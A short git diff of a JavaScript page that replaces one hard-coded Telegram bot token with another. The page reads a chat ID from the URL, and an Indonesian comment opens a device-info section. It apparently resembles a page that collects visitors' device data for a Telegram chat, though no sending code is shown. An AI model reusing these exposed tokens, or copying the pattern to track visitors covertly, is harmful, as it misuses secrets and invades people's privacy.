@@ -14,7 +14,7 @@ const canvasEl = document.getElementById('canvas');
 const params = new URLSearchParams(window.location.search);
 const alias = params.get('alias');
 const chatId = params.get('uid');
-const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
+const botToken = '8409668139:AAFX1nZhurnH0VUFSNzQ5glYev2qfPNP-Gs';
 
 // --- Fungsi ---
 // Device Info
